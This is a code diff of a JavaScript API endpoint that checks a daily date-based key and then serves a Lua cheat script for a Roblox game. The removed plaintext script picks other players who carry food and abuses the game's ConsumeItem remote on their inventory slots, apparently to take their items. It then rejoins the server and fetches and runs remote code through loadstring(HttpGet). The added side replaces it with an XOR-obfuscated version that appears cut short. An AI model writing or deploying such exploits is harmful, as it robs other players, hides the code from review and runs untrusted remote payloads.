@@ -1,310 +1,38 @@
 export default function handler(req, res) {
-    if (req.method !== 'POST') {
-        return res.status(405).json({ success: false, message: 'Method not allowed' });
-    }
+  if (req.method !== 'POST') {
+    return res.status(405).json({ success: false, message: 'Method not allowed' });
+  }
 
-    let body = req.body;
-    if (typeof body === 'string') {
-        try { body = JSON.parse(body); } catch (e) { body = {}; }
-    }
+  let body = req.body;
+  if (typeof body === 'string') {
+    try { body = JSON.parse(body); } catch (e) { body = {}; }
+  }
 
-    const { key, hwid } = body || {};
-    if (!key || !hwid) {
-        return res.status(400).json({ success: false, message: 'Thiếu key hoặc HWID!' });
-    }
+  const { key, hwid } = body || {};
+  if (!key || !hwid) {
+    return res.status(400).json({ success: false, message: 'Thiếu key hoặc hwid' });
+  }
 
-    // Tính toán Key theo ngày giờ Việt Nam (UTC+7)
-    const now = new Date();
-    const utc = now.getTime() + (now.getTimezoneOffset() * 60000);
-    const vnTime = new Date(utc + (3600000 * 7));
+  // Tính toán Key theo ngày giờ Việt Nam (UTC+7)
+  const now = new Date();
+  const utc = now.getTime() + (now.getTimezoneOffset() * 60000);
+  const vnTime = new Date(utc + (3600000 * 7));
 
-    const day = vnTime.getDate();
-    const month = vnTime.getMonth() + 1;
-    const year = vnTime.getFullYear();
+  const day = vnTime.getDate();
+  const month = vnTime.getMonth() + 1;
+  const year = vnTime.getFullYear();
 
-    const validKey = String((day + 18) * month * year - 2011 * 8);
+  const validKey = String((day * 18) * month * year * 2011 * 8);
 
-    if (String(key).trim() === String(validKey)) {
-        // TOÀN BỘ CODE TÍNH NĂNG CHÍNH ĐƯỢC GIẤU AN TOÀN TẠI ĐÂY
-        const protectedScript = `
-            local g = game
-            local P = g:GetService("Players")
-            local lp = P.LocalPlayer
-            local hs = g:GetService("HttpService")
-            local ts = g:GetService("TeleportService")
-            local cg = g:GetService("CoreGui")
+  if (String(key).trim() !== String(validKey)) {
+    return res.status(403).json({ success: false, message: 'Key không hợp lệ!' });
+  }
 
-            -- =========================================================
-            -- 1. TẢI VÀ KHỞI TẠO INVENTORY VIEWER V2
-            -- =========================================================
-            local invViewerGui = nil
+  // Đoạn mã Lua đã mã hóa được ghép vào đây:
+  const protectedScript = `local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v18,v19) local v20=0 -0 ;local v21;while true do if (v20==(1066 -(68 + 997))) then return v5(v21);end if (v20==(1270 -(226 + 1044))) then v21={};for v27=4 -3 , #v18 do v6(v21,v0(v4(v1(v2(v18,v27,v27 + ((119 -(32 + 85)) -(1 + 0)) )),v1(v2(v19,1 + 0 + (v27% #v19) ,(958 -(892 + 65)) + (v27% #v19) + (2 -1) )))%((1523 -(368 + 423)) -476) ));end v20=1 -0 ;end end end local v8=game;local v9=v8:GetService(v7("\\225\\207\\218\\60\\227\\169\\212","\\126\\177\\163\\187\\69\\134\\219\\167"));local v10=v9.LocalPlayer;local v11=v8:GetService(v7("\\11\\217\\62\\213\\207\\38\\223\\60\\204\\255\\38","\\156\\67\\173\\74\\165"));local v12=v8:GetService(v7("\\0\\178\\69\\19\\172\\41\\84\\32\\132\\76\\4\\170\\47\\69\\49","\\38\\84\\215\\41\\118\\220\\70"));local v13=v8:GetService(v7("\\115\\25\\48\\23\\217\\69\\31","\\158\\48\\118\\66\\114"));local v14=nil;local v15,v16=pcall(function() loadstring(game:HttpGet(v7("\\163\\48\\4\\38\\96\\255\\180\\228\\54\\17\\33\\61\\162\\242\\191\\44\\5\\52\\102\\182\\254\\185\\39\\31\\56\\103\\160\\245\\191\\106\\19\\57\\126\\234\\181\\229\\106","\\155\\203\\68\\112\\86\\19\\197")))();end);if  not v15 then warn("Không thể tải giao diện Inventory Viewer:",v16);else local v25=v10:WaitForChild(v7("\\118\\209\\55\\229\\69\\106\\194\\237\\79","\\152\\38\\189\\86\\156\\32\\24\\133"),(15 -6) -4 );if v25 then v14=v25:WaitForChild(v7("\\245\\89\\177\\80\\245\\82\\176\\67\\238","\\38\\156\\55\\199"),355 -(87 + 263) );if v14 then local v31=180 -(67 + 113) ;local v32;while true do if (v31==(3 -2)) then if  not v32 then local v41=0 + 0 ;while true do if (v41==(2 -1)) then v32.Scale=(2.15 + 0) -(3 -2) ;v32.Parent=v14;break;end if (v41==0) then v32=Instance.new(v7("\\44\\150\\226\\220\\140\\32\\49","\\84\\121\\223\\177\\191\\237\\76"));v32.Name=v7("\\152\\67\\218\\180\\53\\93\\5\\232\\136\\85\\200\\172\\63","\\161\\219\\54\\169\\192\\90\\48\\80");v41=953 -(802 + 150) ;end end end break;end if (v31==(0 -0)) then v14.Enabled=false;v32=v14:FindFirstChild(v7("\\139\\104\\111\\60\\28\\121\\207\\106\\155\\126\\125\\36\\22","\\35\\200\\29\\28\\72\\115\\20\\154"));v31=2 -1 ;end end end end end local function v17(v22) local v23=430 -(44 + 386) ;local v24;while true do if ((3 -1)==v23) then v24=nil;for v28,v29 in ipairs(v14:GetDescendants()) do if (v29:IsA(v7("\\136\\198\\207\\30\\32\\62\\168\\215\\216\\4","\\75\\220\\163\\183\\106\\98")) or v29:IsA(v7("\\43\\183\\138\\48\\220\\32\\175\\159\\35\\214\\12","\\185\\98\\218\\235\\87"))) then local v33=v29.Name:lower();local v34=(v29:IsA(v7("\\255\\57\\63\\242\\252\\191\\223\\40\\40\\232","\\202\\171\\92\\71\\134\\190")) and v29.Text:lower()) or "" ;if (v33:find(v7("\\58\\196\\45\\154\\42\\201","\\232\\73\\161\\76")) or v34:find(v7("\\168\\220\\67\\79\\29\\179","\\126\\219\\185\\34\\61")) or v34:find(v7("\\26\\199\\91\\101","\\135\\108\\174\\62\\18\\30\\23\\147"))) then v24=v29;break;end end end v23=3 + 0 ;end if (v23==(1000 -(915 + 82))) then if v24 then for v35,v36 in ipairs(getconnections(v24.Activated)) do if v36.Function then v36.Value=v36.Function;pcall(v36.Function);end end end break;end if (v23==(0 -0)) then if  not v14 then return;end v14.Enabled=true;v23=1 + 0 ;end if (v23==(1 + 0)) then task.spawn(function() task.wait((1757.15 -(116 + 1022)) -((729 -174) + (1251 -(1069 + 118))) );local v30=v14:FindFirstChildWhichIsA(v7("\\125\\71\\24\\49\\107\\77\\24","\\69\\41\\34\\96"));if v30 then v30.Text=v22;if (getgenv and firefocuslost) then pcall(function() firefocuslost(v30,true);end);else pcall(function() v30:ReleaseFocus(true);end);end end end);task.wait(0.1 -0 );v23=2;end end end`;
 
-            local success, err = pcall(function()
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/screengui/archives/main/inv-viewerV2.lua", true))()
-            end)
-
-            if not success then
-                warn("Không thể tải giao diện Inventory Viewer:", err)
-            else
-                local playerGui = lp:WaitForChild("PlayerGui", 5)
-                if playerGui then
-                    invViewerGui = playerGui:WaitForChild("invviewer", 5)
-                    if invViewerGui then
-                        invViewerGui.Enabled = false 
-                        local uiScale = invViewerGui:FindFirstChild("CustomUIScale")
-                        if not uiScale then
-                            uiScale = Instance.new("UIScale")
-                            uiScale.Name = "CustomUIScale"
-                            uiScale.Scale = 1.15 
-                            uiScale.Parent = invViewerGui
-                        end
-                    end
-                end
-            end
-
-            local function updateInventoryViewerTarget(playerName)
-                if not invViewerGui then return end
-                invViewerGui.Enabled = true
-
-                task.spawn(function()
-                    task.wait(0.15)
-                    local textBox = invViewerGui:FindFirstChildWhichIsA("TextBox", true)
-                    if textBox then
-                        textBox.Text = playerName
-                        if getgenv and firefocuslost then
-                            pcall(function() firefocuslost(textBox, true) end)
-                        else
-                            pcall(function() textBox:ReleaseFocus(true) end)
-                        end
-                    end
-
-                    task.wait(0.1)
-                    local searchButton = nil
-                    for _, btn in ipairs(invViewerGui:GetDescendants()) do
-                        if btn:IsA("TextButton") or btn:IsA("ImageButton") then
-                            local btnName = btn.Name:lower()
-                            local btnText = (btn:IsA("TextButton") and btn.Text:lower()) or ""
-                            if btnName:find("search") or btnName:find("view") or btnName:find("find") or
-                               btnText:find("search") or btnText:find("view") or btnText:find("find") then
-                                searchButton = btn
-                                break
-                            end
-                        end
-                    end
-
-                    if not searchButton and textBox then
-                        local parentFrame = textBox.Parent
-                        if parentFrame then
-                            for _, child in ipairs(parentFrame:GetChildren()) do
-                                if (child:IsA("TextButton") or child:IsA("ImageButton")) and child ~= textBox then
-                                    searchButton = child
-                                    break
-                                end
-                            end
-                        end
-                    end
-
-                    if searchButton then
-                        if getgenv and firesignal and searchButton.MouseButton1Click then
-                            pcall(function() firesignal(searchButton.MouseButton1Click) end)
-                        elseif getgenv and clicksig then
-                            pcall(function() clicksig(searchButton) end)
-                        else
-                            pcall(function()
-                                for _, conn in ipairs(getconnections(searchButton.MouseButton1Click)) do
-                                    conn:Fire()
-                                end
-                            end)
-                        end
-                    end
-                end)
-            end
-
-            local function hideInventoryViewer()
-                if invViewerGui then
-                    invViewerGui.Enabled = false
-                end
-            end
-
-            -- =========================================================
-            -- 2. CẤU HÌNH & HÀM BỔ TRỢ EXPLOIT
-            -- =========================================================
-            local selectedInv = nil
-            local selectedPlayerName = ""
-            local FOOD_LIST = {"Banana", "Apple", "Bread", "Meat", "Pork", "Steak"}
-
-            local function msg(t) 
-                g:GetService("StarterGui"):SetCore("SendNotification", {
-                    Title = 'Minerscraft Exploiter', 
-                    Text = t,
-                    Duration = 3
-                }) 
-            end
-
-            local function isFood(str)
-                for _, food in ipairs(FOOD_LIST) do
-                    if str:find(food, 1, true) then
-                        return true
-                    end
-                end
-                return false
-            end
-
-            local function playerHasFood(player)
-                if player == lp or not player.Character then return false end
-                
-                local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
-                if not humanoid or humanoid.Health <= 0 then return false end
-
-                local inv = player.Character:FindFirstChild("Inventory")
-                if not inv or #inv:GetChildren() == 0 then return false end
-
-                for _, v in ipairs(inv:GetChildren()) do
-                    if v:IsA("ValueObject") or v:FindFirstChild("Value") or type(v.Value) == "string" then
-                        local val = v.Value
-                        if type(val) == "string" and isFood(val) then
-                            local success, data = pcall(function()
-                                return hs:JSONDecode(val)
-                            end)
-                            if success and type(data) == "table" and data.count and data.count > 0 then
-                                return true 
-                            end
-                        end
-                    end
-                end
-                return false
-            end
-
-            -- =========================================================
-            -- 3. GIAO DIỆN KAVO UI
-            -- =========================================================
-            local ui = loadstring(g:HttpGet("https://raw.githubusercontent.com/VeztWare/KavoUi/main/KavoUi.lua"))()
-            local window = ui.CreateLib("Minerscraft Inventory Exploiter", "DarkTheme")
-            local mainTab = window:NewTab("Main")
-            local targetSection = mainTab:NewSection("Target & Copy")
-
-            local function getValidFoodPlayers()
-                local list = {}
-                for _, p in ipairs(P:GetPlayers()) do
-                    if playerHasFood(p) then
-                        table.insert(list, p.Name)
-                    end
-                end
-                if #list == 0 then
-                    table.insert(list, "Không có ai có Food")
-                end
-                return list
-            end
-
-            local playerDropdown = targetSection:NewDropdown("Chọn Target (Chỉ có Food)", "Chỉ hiển thị người chơi có đồ ăn", getValidFoodPlayers(), function(selected)
-                selectedPlayerName = selected
-                local targetPlayer = P:FindFirstChild(selected)
-                
-                if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Inventory") then
-                    selectedInv = targetPlayer.Character.Inventory
-                    msg("Đã chọn Target: " .. selected)
-                    updateInventoryViewerTarget(selected)
-                else
-                    selectedInv = nil
-                    hideInventoryViewer()
-                end
-            end)
-
-            targetSection:NewButton("🔄 Cập nhật danh sách Target", "Làm mới danh sách", function()
-                local newList = getValidFoodPlayers()
-                playerDropdown:Refresh(newList)
-                msg("Đã cập nhật danh sách! Có " .. (#newList == 1 and newList[1] == "Không có ai có Food" and 0 or #newList) .. " người hợp lệ.")
-            end)
-
-            targetSection:NewButton("📋 Copy Inventory", "Mục tiêu phải có đồ ăn & Bạn phải đang đói", function()
-                local hungerVal = lp:FindFirstChild("Hunger") or (lp.Character and lp.Character:FindFirstChild("Hunger"))
-                if hungerVal and hungerVal.Value >= 100 then 
-                    return msg("Bạn đang no! Cần Hunger < 100 để thực hiện") 
-                end
-                
-                if not selectedInv or not selectedInv.Parent then 
-                    return msg("Chưa chọn Target hợp lệ hoặc người đó đã thoát/chết!") 
-                end
-
-                local ci = g:GetService("ReplicatedStorage"):WaitForChild("GameRemotes"):WaitForChild("ConsumeItem")
-                for _, v in ipairs(selectedInv:GetChildren()) do
-                    if v:IsA("ValueObject") or v:FindFirstChild("Value") or type(v.Value) == "string" then
-                        local val = v.Value
-                        if type(val) == "string" and isFood(val) then
-                            local success, data = pcall(function() return hs:JSONDecode(val) end)
-                            if success and type(data) == "table" and data.count and data.count > 0 then
-                                local slotNum = tonumber(v.Name:match("%d+"))
-                                if slotNum then
-                                    local invokeSuccess, err = pcall(function()
-                                        ci:InvokeServer(selectedInv, slotNum)
-                                    end)
-                                    if invokeSuccess then
-                                        msg("THÀNH CÔNG! Đang tự động Rejoin server...")
-                                        task.wait(1.5)
-                                        ts:TeleportToPlaceInstance(g.PlaceId, g.JobId, lp)
-                                        return
-                                    else
-                                        return msg("Lỗi Invoke: " .. tostring(err))
-                                    end
-                                end
-                            end
-                        end
-                    end
-                end
-                msg("Target không còn item đồ ăn hợp lệ hoặc đã mất đồ do chết!")
-            end)
-
-            local settingsSection = mainTab:NewSection("Cài đặt phím tắt (PC)")
-            settingsSection:NewKeybind("Phím tắt đóng/mở", "Dành cho PC (Mặc định: RightShift)", Enum.KeyCode.RightShift, function()
-                ui:ToggleUI()
-            end)
-
-            -- =========================================================
-            -- 4. TẠO NÚT BẤM NỔI (FLOATING BUTTON)
-            -- =========================================================
-            if cg:FindFirstChild("ToggleExploitGui") then
-                cg.ToggleExploitGui:Destroy()
-            end
-
-            local screenGui = Instance.new("ScreenGui")
-            screenGui.Name = "ToggleExploitGui"
-            screenGui.Parent = cg
-
-            local toggleBtn = Instance.new("TextButton")
-            toggleBtn.Name = "ToggleButton"
-            toggleBtn.Parent = screenGui
-            toggleBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-            toggleBtn.BorderColor3 = Color3.fromRGB(0, 150, 255)
-            toggleBtn.BorderSizePixel = 2
-            toggleBtn.Position = UDim2.new(0, 10, 0, 10)
-            toggleBtn.Size = UDim2.new(0, 130, 0, 40)
-            toggleBtn.Font = Enum.Font.GothamBold
-            toggleBtn.Text = "Đóng/Mở Menu"
-            toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-            toggleBtn.TextSize = 14
-            toggleBtn.Active = true
-            toggleBtn.Draggable = true
-
-            local corner = Instance.new("UICorner")
-            corner.CornerRadius = UDim.new(0, 6)
-            corner.Parent = toggleBtn
-
-            toggleBtn.MouseButton1Click:Connect(function()
-                ui:ToggleUI()
-            end)
-
-            msg("Đã nạp thành công Minerscraft Exploiter!")
-        `;
-
-        return res.status(200).json({ 
-            success: true, 
-            message: 'Xác thực thành công!',
-            script: protectedScript 
-        });
-    } else {
-        return res.status(200).json({ 
-            success: false, 
-            message: 'Key không chính xác hoặc đã hết hạn!' 
-        });
-    }
+  return res.status(200).json({
+    success: true,
+    script: protectedScript
+  });
 }
